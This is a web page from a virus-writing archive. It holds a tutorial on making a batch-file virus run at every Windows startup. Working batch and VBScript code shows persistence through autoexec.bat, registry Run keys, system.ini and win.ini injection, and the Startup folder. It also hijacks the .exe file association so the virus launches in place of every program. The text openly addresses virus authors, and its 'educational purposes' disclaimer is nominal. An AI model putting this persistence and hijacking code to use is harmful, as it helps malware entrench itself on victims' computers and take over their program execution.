<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title> cOrRuPt G3n3t!x 'Batch Run Techniques' (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content="cOrRuPt G3n3t!x"/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, cOrRuPt G3n3t!x,Batch Run Techniques, temp, echo, find, tutorial, shell, windows, executed, winboot, batch, user, type, keys, hkey, virus, boot"/>
<meta name="Description" content="In this tutorial I will be discussing the different methods in which you can make your batch file execute on startup, all of the ways depicted in this tutorial work on Windows Vista! It is essential for a proper virus to startup each time the computer is booted so it can carry out it's routines on a frequent basis. This tutorial is not for people trying to learn batch but rather for those trying to advance in batch!! I would also like to send a big thanks to SAD1c for some of the code i used from his tutorials!!"/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"55553dbc55a759363d30c3b97b1e643295b1b05f-1498757831-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vcg02.html"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: right;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="12" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div class="s2"><h1>Batch Run Techniques</h1><p><a href="/lib/?lang=en&amp;author=cOrRuPt%20G3n3t%21x"> cOrRuPt G3n3t!x</a><br/> <em>July 2009</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vcg02.html';</script>[<a style="" href="/lib/?lang=EN&amp;index=MA#vcg02">Back to index</a>] [<a href="/lib/vcg02.html#disqus_thread">Comments</a>]<br/> 
<p>In this tutorial I will be discussing the different methods in which you can make your batch file execute on startup, all of the ways depicted in this tutorial work on Windows Vista! It is essential for a proper virus to startup each time the computer is booted so it can carry out it's routines on a frequent basis. This tutorial is not for people trying to learn batch but rather for those trying to advance in batch!! I would also like to send a big thanks to SAD1c for some of the code i used from his tutorials!!</p>
<h2>1)Autoexec.bat Method:</h2>
<p>There are 2 differnt methods in autoexec.bat, we can either write the whole virus to autoexec.bat or we can simply make a hook for autoexec.bat to call our virus. I personally prefer the hooking method, as an oversized autoexec.bat may raise a few eyebrows, however, I shall illustrate both methods.</p>
<h3>a)Copying whole virus to autoexec.bat (this should be put in the begining of your virus):</h3>
<pre class="source">
attrib -r -h C:\autoexec.bat
echo.@echo off&gt;&gt;C:\autoexec.bat
echo.echo my virus would be here&gt;&gt;C:\autoexec.bat
echo.pause&gt;&gt;C:\autoexec.bat
attrib +r +h C:\autoexec.bat
</pre>
<p>All you have to do is add your virus code lines in the lines where i put the 'echo my virus...' and 'pause' adding more lines as needed, it will then write your virus code to autoexec.bat</p>
<h3>b)Hooking Autoexec.bat Technique (HAT):</h3>
<p>This is my prefered method and it will copy the current batch file to C:\virus.bat and then hook the batch file C:\virus.bat for the next startup (Should be placed at begining of Virus):</p>
<pre class="source">
attrib -r -h C:\autoexec.bat
copy %0 C:\WinServ.bat &gt;nul
type C:\autoexec.bat|find "WinServ.bat"&gt;C:\autoexec.bat
echo call C:\WinServ.bat&gt;&gt;C:\autoexec.bat
attrib +r +h C:\autoexec.bat
</pre>
<p>All you need to do is change the batch name from Winserv.bat to your own, what this code will do is write a new hooking line each startup to make sure the batch only gets called up once per start up.</p>
<h2>2)Registery Method:</h2>
<p>This will show the various registery keys you could use to execute your batch file each run. Although there are different registery keys doing different things, they will all - in practice - ultimately startup your virus on each computer boot:</p>
<p>As I said before there are many variants; here are some:</p>
<ul>
<li>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</li>
<li>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</li>
<li>HKEY_LOCAL_MACHINE\SOFTWARE\ Microsoft\Windows\CurrentVersion\RunServices</li>
<li>HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServicesOnce</li>
<li>HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</li>
</ul>
<p>The "RunOnce" and "RunServicesOnce" deletes the registry key after running the file, but this isn't a problem, because the batch file will be executed again, so it will add the key. Now they all work on the same principle when adding the keys to the registery so i shall now show you two keys the first is '-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' This will then add a registery key in HKLM startup called 'WinBoot' and the path of the virus will be C:\virus.bat:</p>
<p>REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v WinBoot /t REG_SZ /d C:\virus.bat</p>
<p>The name of the startup key and the location of the virus can be changed at will.</p>
<p>Next i will show the registery ADD key for HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run It works on the same principle except because we are dealling with HKEY_CURRENT_USER instead of HKEY_LOCAL_MACHINE we then write 'REG ADD HKCU...." See below:</p>
<p>REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v WinBoot /t REG_SZ /d C:\virus.bat</p>
<h2>3)System.ini Method:</h2>
<p>This method will make System.ini call your batch file up each startup, we cannot just write to the system.ini as it will then delete whatever else was in their so instead we write a seperate file in %tmp% then type it in to the sytem.ini pretty simple i'd say:</p>
<pre class="source">
copy %0 %windir%\WinDebug.bat
find /v /i "[boot]"&lt;%WiNDir%\system.ini&gt;temp1.tmp
find /v /i "shell=explorer.exe"&lt;temp1.tmp&gt;temp2.tmp
echo [boot]&gt;%wIndIR%\system.ini
echo Shell=Explorer.exe WinDebug.bat&gt;&gt;%wiNdIR%\system.ini
type temp2.tmp&gt;&gt;%WIndIR%\system.ini
del temp?.tmp
</pre>
<h2>4)Win.ini Method:</h2>
<p>We shall now do the same for win.ini; write to a temporary then type it into win.ini, see below:</p>
<pre class="source">
copy %0 %windir%\TaskLoad.bat.
find /v /i "[windows]"&lt;%windir%\win.ini&gt;temp1.tmp
find /v /i "load="&lt;temp1.tmp&gt;temp2.tmp
find /v /i "run="&lt;temp2.tmp&gt;temp1.tmp
find /v /i "NullPort="&lt;temp1.tmp&gt;temp2.tmp
echo [windows]&gt;%wiNdIR%\win.ini
echo load=TaskLoad.bat&gt;&gt;%winDIr%\win.ini
echo run=&gt;&gt;%wINDir%\win.ini
echo NullPort=None&gt;&gt;%windIr%\win.ini
type temp2.tmp&gt;&gt;%wiNDir%\win.ini
del temp?.tmp
</pre>
<h2>5)Startup Folder Method:</h2>
<p>We will now look at the simplest and not very effective method as most computer literate people will look here for any application that starts up, but still effective, however, i could not get it to write to windows Vista startup folder, i have done it before but for the life of me i cannot remember the technique i used so for now this method will only work on XP:</p>
<pre class="source">
Copy %0 C:\WinBoot.bat
copy C:\WinBoot.bat "%UserProfile%\Start Menu\Programs\Startup"
</pre>
<h2>6)Shell Spawning:</h2>
<p>Shell spawning was first seen in SAD1c's BOM batch generator, what it does is associate our batch file with the extension of an .exe or anything else we give it, so each time an .exe is opened, it will then instead open our batch file and the .exe wont be opened, a very good way to keep our batch in memory. I tried out SAD1c's Shell spawn and it did not gel to well with my windows vista, so instead i made my own; similar but alot smaller and less complex:</p>
<pre class="source">
copy %0 C:\WinBat.bat
echo.on error resume next&gt;temp.vbs
echo set sh=createobject("wscript.shell")&gt;&gt;temp.vbs
echo sh.regwrite "HKCR\exefile\Shell\Open\Command","wscript.exe C:\CmdLoad.vbs ""%%1 %%*"""&gt;&gt;temp.vbs
cscript temp.vbs
del temp.vbs
echo.set shell = createobject("wscript.shell")&gt;&gt;C:\CmdLoad.vbs
echo.shell.run "C:\WinBat.bat"&gt;&gt;C:\CmdLoad.vbs
</pre>
<p>It is important to take into account, that alot of .exe's will be executed therefore your batch will untechnically have residency, so if your batch is set to send over p2p etc and it is contionusly executed this could slow down systems even to a halt!! We therefore should make parameters, and if they are met then only is the batch routine executed.</p>
<p>Thanks alot for taking your time to read this, i hope it will help you with further ventures into more awesome batch virii. Please contact me on <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="adc4c0c0c2dfd9ccc1ccdedeccdedec4c3eddfc2cec6c8d9c0ccc4c183cec2c0">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> for any queries, problems etc. REMEMBER THIS TUTORIAL IS FOR EDUCATIONAL PURPOSES ONLY!! Look out for my next tutorial on 'Awesome Payloads in Batch'. Until then keep on batching :)!!!</p>
<div id="disqus_thread"></div>
<script type="text/rocketscript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vcg02">de</a><a href="/lib/index.php?lang=en&amp;id=vcg02">en</a><a href="/lib/index.php?lang=es&amp;id=vcg02">es</a><a href="/lib/index.php?lang=it&amp;id=vcg02">it</a><a href="/lib/index.php?lang=fr&amp;id=vcg02">fr</a><a href="/lib/index.php?lang=pl&amp;id=vcg02">pl</a><a href="/lib/index.php?lang=ru&amp;id=vcg02">ru</a><a href="/lib/index.php?lang=ua&amp;id=vcg02">ua</a></div>
</body>
</html>
